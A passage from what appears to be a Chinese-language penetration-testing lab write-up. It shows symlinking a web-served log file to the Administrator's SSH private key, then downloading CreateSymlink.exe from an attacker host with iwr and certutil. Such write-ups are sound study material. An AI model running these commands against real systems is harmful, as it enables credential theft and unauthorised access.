我们查看了文件没有什么特别的，竟然可以备份文件，我们考虑是否做一个符号链接，但执行失败

```
mklink C:\xampp\htdocs\logs\request.log C:\Users\Administrator\.ssh\id_rsa
New-Item C:\xampp\htdocs\logs\request.log -ItemType SymbolicLink -Target C:\Users\Administrator\.ssh\id_rsa
```

![image-20250111004315846](https://s2.loli.net/2025/01/11/XW3ikoDpzOqU75f.png)

我们通过搜索，找到一个工具来实现这点

![image-20250111004349574](https://s2.loli.net/2025/01/11/u8LvWBhbrR1Kc37.png)

https://github.com/googleprojectzero/symboliclink-testing-tools

我们使用CreateSymlink.exe 工具

```
cd c:\backup
iwr http://192.168.45.187/CreateSymlink.exe -outfile CreateSymlink.exe
.\CreateSymlink.exe -p "C:\xampp\htdocs\logs\request.log"  "C:\Users\Administrator\.ssh\id_rsa" 

certutil -urlcache -f http://192.168.45.208/CreateSymlink.exe CreateSymlink.exe
CreateSymlink.exe "C:\xampp\htdocs\logs\request.log" "C:\Users\Administrator\.ssh\id_rsa"

```
